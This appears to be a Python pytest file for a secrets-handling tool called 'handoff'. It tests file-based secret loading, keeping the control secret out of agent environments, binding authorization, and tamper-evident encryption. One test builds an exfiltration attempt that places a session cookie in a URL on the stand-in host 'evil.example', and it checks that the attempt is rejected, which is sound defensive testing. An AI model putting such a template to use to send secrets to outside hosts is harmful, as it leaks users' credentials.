"""密钥文件配置：值只放文件，框架读文件注入进程环境。"""

from __future__ import annotations

import pytest
import yaml

from handoff.config import Config
from handoff.errors import ConfigError, ExecutionError, SchemaError
from handoff.secrets import (
    agent_env,
    collect_requirements,
    config_secret,
    decrypt_provision_value,
    encrypt_provision_value,
    proof,
    resolve_secret,
    secret_env,
    binding_allowed,
)
from helpers import make_bare_remote, make_store_repo, repo_entry, write_config


def build(tmp_path):
    work, _bare = make_store_repo(tmp_path)
    backend = make_bare_remote(tmp_path, "api", {"src/a.txt": "a\n"})
    write_config(
        work,
        repos=[repo_entry("org/api", "backend", backend), repo_entry("org/web", "frontend", backend)],
    )
    return work


def _write_local(work, secrets: dict):
    (work / "config" / "local.yaml").write_text(
        yaml.safe_dump({"secrets": secrets}, allow_unicode=True), encoding="utf-8"
    )


def test_secrets_loaded_from_local_yaml(tmp_path):
    work = build(tmp_path)
    (work / "notify.key").write_text("notify-secret-value-from-file\n", encoding="utf-8")
    (work / "api.key").write_text("api-key-value-from-file\n", encoding="utf-8")
    _write_local(work, {
        "HANDOFF_NOTIFY_SECRET_FILE": "notify.key",
        "OPENAPI_API_KEY_FILE": "api.key",
    })

    config = Config.load(work)

    assert config.secrets.HANDOFF_NOTIFY_SECRET_FILE == "notify.key"
    assert config.secrets.OPENAPI_API_KEY_FILE == "api.key"
    assert config_secret(config, "HANDOFF_NOTIFY_SECRET") == "notify-secret-value-from-file"
    assert config_secret(config, "OPENAPI_API_KEY") == "api-key-value-from-file"


def test_agent_env_never_injects_notification_control_secret(tmp_path):
    work = build(tmp_path)
    (work / "notify.key").write_text("notify-secret-value\n", encoding="utf-8")
    (work / "api.key").write_text("api-key-value\n", encoding="utf-8")
    _write_local(work, {
        "HANDOFF_NOTIFY_SECRET_FILE": "notify.key",
        "OPENAPI_API_KEY_FILE": "api.key",
    })
    config = Config.load(work)

    env = agent_env(config)

    assert env == {"OPENAPI_API_KEY": "api-key-value"}
    assert "HANDOFF_NOTIFY_SECRET" not in env


def test_agent_env_missing_file_is_omitted(tmp_path):
    work = build(tmp_path)
    _write_local(work, {
        "OPENAPI_API_KEY_FILE": "does-not-exist.key",
    })
    config = Config.load(work)

    assert agent_env(config) == {}


def test_resolve_secret_env_wins(tmp_path, monkeypatch):
    work = build(tmp_path)
    (work / "api.key").write_text("from-file\n", encoding="utf-8")
    _write_local(work, {"OPENAPI_API_KEY_FILE": "api.key"})
    config = Config.load(work)
    monkeypatch.setenv("OPENAPI_API_KEY", "from-env")

    assert resolve_secret(config, "OPENAPI_API_KEY") == "from-env"


def test_secrets_rejects_unknown_key(tmp_path):
    work = build(tmp_path)
    _write_local(work, {"SOME_OTHER_SECRET_FILE": "x"})

    with pytest.raises(ConfigError) as excinfo:
        Config.load(work)
    assert "secrets 有未知键" in str(excinfo.value)


def test_secrets_rejects_value_not_path(tmp_path):
    work = build(tmp_path)
    _write_local(work, {"OPENAPI_API_KEY_FILE": 12345})

    with pytest.raises(ConfigError) as excinfo:
        Config.load(work)
    assert "必须是文件路径字符串" in str(excinfo.value)


def test_verifier_resolves_docs_api_key_from_config(tmp_path, monkeypatch):
    """任务单里的 {env:DOCS_API_KEY} 与 OPENAPI_API_KEY 是同一把 key。"""
    from handoff.verifier import _substitute

    work = build(tmp_path)
    (work / "api.key").write_text("shared-key\n", encoding="utf-8")
    _write_local(work, {"OPENAPI_API_KEY_FILE": "api.key"})
    config = Config.load(work)
    monkeypatch.delenv("DOCS_API_KEY", raising=False)
    monkeypatch.delenv("OPENAPI_API_KEY", raising=False)

    resolved = _substitute(
        "{base_url}/docs/openapi.json?apikey={env:DOCS_API_KEY}",
        "https://api.example.com",
        config,
    )
    assert resolved == "https://api.example.com/docs/openapi.json?apikey=shared-key"


def test_verifier_env_still_wins(tmp_path, monkeypatch):
    from handoff.verifier import _substitute

    work = build(tmp_path)
    (work / "api.key").write_text("from-file\n", encoding="utf-8")
    _write_local(work, {"OPENAPI_API_KEY_FILE": "api.key"})
    config = Config.load(work)
    monkeypatch.setenv("DOCS_API_KEY", "from-env")

    resolved = _substitute(
        "{base_url}/docs/openapi.json?apikey={env:DOCS_API_KEY}",
        "https://api.example.com",
        config,
    )
    assert "apikey=from-env" in resolved


def test_notification_secret_falls_back_to_config_file(tmp_path, monkeypatch):
    """通知签名密钥从配置的文件读取，不依赖启动进程的环境变量。"""
    from handoff.notification import load_secret

    work = build(tmp_path)
    secret = "notify-secret-at-least-32-bytes-long!!"
    (work / "notify.key").write_text(f"{secret}\n", encoding="utf-8")
    _write_local(work, {"HANDOFF_NOTIFY_SECRET_FILE": "notify.key"})
    config = Config.load(work)
    monkeypatch.delenv("HANDOFF_NOTIFY_SECRET", raising=False)
    monkeypatch.delenv("HANDOFF_NOTIFY_SECRET_FILE", raising=False)

    # 只把 NotificationConfig 交给通知模块（真实调用路径），它靠 _app_config 回指取文件
    assert load_secret(config.notifications) == secret.encode("utf-8")


def test_generic_reference_resolves_file_and_env_override(tmp_path, monkeypatch):
    work = build(tmp_path)
    (work / "session.cookie").write_text("from-reference-file\n", encoding="utf-8")
    _write_local(work, {"refs": {"saas-session": "session.cookie"}})
    config = Config.load(work)

    assert resolve_secret(config, "SAAS_TEST_SESSION_COOKIE", ref="saas-session") == "from-reference-file"
    monkeypatch.setenv("SAAS_TEST_SESSION_COOKIE", "from-process-env")
    assert resolve_secret(config, "SAAS_TEST_SESSION_COOKIE", ref="saas-session") == "from-process-env"


def test_collect_requirements_binds_placeholder_to_explicit_reference(tmp_path):
    work = build(tmp_path)
    _write_local(work, {"bindings": {"SAAS_TEST_SESSION_COOKIE": "saas-session"}})
    config = Config.load(work)
    task = {
        "required_secrets": [
            {"ref": "saas-session", "env": "SAAS_TEST_SESSION_COOKIE", "same_value": True}
        ],
        "acceptance": {
            "checks": [{
                "id": "saas",
                "type": "http",
                "method": "GET",
                "url": "{base_url}/session",
                "headers": {"Cookie": "{env:SAAS_TEST_SESSION_COOKIE}"},
                "expect_status": 200,
            }]
        },
    }

    assert collect_requirements(task, config) == task["required_secrets"]
    assert binding_allowed(config, "saas-session", "SAAS_TEST_SESSION_COOKIE")


def test_collect_requirements_rejects_unauthorized_binding_and_cross_origin_url(tmp_path):
    work = build(tmp_path)
    config = Config.load(work)
    header = {"Authorization": "{env:SAAS_TEST_SESSION_COOKIE}"}

    unauthorized = {
        "required_secrets": [
            {"ref": "attacker-ref", "env": "SAAS_TEST_SESSION_COOKIE", "same_value": True}
        ],
        "acceptance": {"checks": [{
            "id": "saas", "type": "http", "method": "GET", "url": "{base_url}/session",
            "headers": header, "expect_status": 200,
        }]},
    }
    with pytest.raises(SchemaError, match="未在本机 secrets.bindings 授权"):
        collect_requirements(unauthorized, config)

    cross_origin = {
        "acceptance": {"checks": [{
            "id": "saas", "type": "http", "method": "GET",
            "url": "https://evil.example/{env:SAAS_TEST_SESSION_COOKIE}",
            "headers": header, "expect_status": 200,
        }]},
    }
    with pytest.raises(SchemaError, match="必须使用.*同源"):
        collect_requirements(cross_origin, config)


def test_custom_notification_control_env_cannot_be_requested(tmp_path):
    work = build(tmp_path)
    (work / "config" / "local.yaml").write_text(
        yaml.safe_dump({"notifications": {"secret_env": "CUSTOM_CONTROL_SECRET"}}),
        encoding="utf-8",
    )
    config = Config.load(work)
    task = {
        "acceptance": {"checks": [{
            "id": "unsafe",
            "type": "http",
            "method": "GET",
            "url": "{base_url}/x",
            "headers": {"Authorization": "{env:CUSTOM_CONTROL_SECRET}"},
            "expect_status": 200,
        }]}
    }
    with pytest.raises(SchemaError, match="未在本机 secrets.refs/bindings 授权"):
        collect_requirements(task, config)


def test_one_time_proof_is_bound_to_challenge_reference_and_control_secret():
    common = dict(
        request_id="01ARZ3NDEKTSV4RRFFQ69G5FAV",
        ref="saas-session",
        env="COOKIE",
        control_secret=b"control-key",
    )
    first = proof("secret-value", challenge="a" * 64, **common)
    assert first == proof("secret-value", challenge="a" * 64, **common)
    assert first != proof("secret-value", challenge="b" * 64, **common)
    assert first != proof("secret-value", challenge="a" * 64, **{**common, "ref": "other"})
    assert first != proof("secret-value", challenge="a" * 64, **{**common, "control_secret": b"another-control-key"})


def test_secret_env_reports_reference_without_value_or_file_path(tmp_path):
    work = build(tmp_path)
    _write_local(work, {"refs": {"missing-ref": "private/missing-secret.txt"}})
    config = Config.load(work)
    with pytest.raises(ExecutionError) as excinfo:
        secret_env(config, [{"ref": "missing-ref", "env": "MISSING_TOKEN", "same_value": True}])
    message = str(excinfo.value)
    assert "missing-ref" in message
    assert "private/missing-secret.txt" not in message


def test_provision_encryption_roundtrip_and_tamper_detection():
    control = b"shared-notification-control-secret-32bytes"
    value = "session=abc123; path=/; HttpOnly\n第二行 ✓"
    encoded = encrypt_provision_value(value, control_secret=control)
    assert isinstance(encoded, str)
    assert value not in encoded
    assert "abc123" not in encoded
    assert decrypt_provision_value(encoded, control_secret=control) == value
    # 不同控制密钥无法解密（tag 校验失败，且不回显任何明文）。
    with pytest.raises(ExecutionError, match="校验|签名|无效|tag|认证"):
        decrypt_provision_value(encoded, control_secret=b"another-control-secret-32bytes!!")

    # 篡改密文的任意字节都会被 HMAC tag 拒绝。
    import base64
    raw = bytearray(base64.b64decode(encoded))
    raw[20] ^= 0x01
    tampered = base64.b64encode(bytes(raw)).decode("ascii")
    with pytest.raises(ExecutionError):
        decrypt_provision_value(tampered, control_secret=control)
